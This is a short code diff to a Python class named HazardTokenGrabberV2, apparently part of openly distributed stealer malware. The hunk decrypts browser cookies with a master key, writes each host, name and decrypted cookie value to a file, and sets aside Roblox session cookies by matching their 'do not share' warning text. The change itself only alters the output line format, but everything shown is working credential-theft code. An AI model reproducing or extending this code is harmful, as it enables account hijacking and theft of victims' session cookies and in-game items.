@@ -425,7 +425,7 @@ class HazardTokenGrabberV2(Functions):
                 user = r[1]
                 decrypted_cookie = self.decrypt_val(r[2], master_key)
                 if host != "":
-                    f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+                    f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                 if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                     self.robloxcookies.append(decrypted_cookie)
         cursor.close()
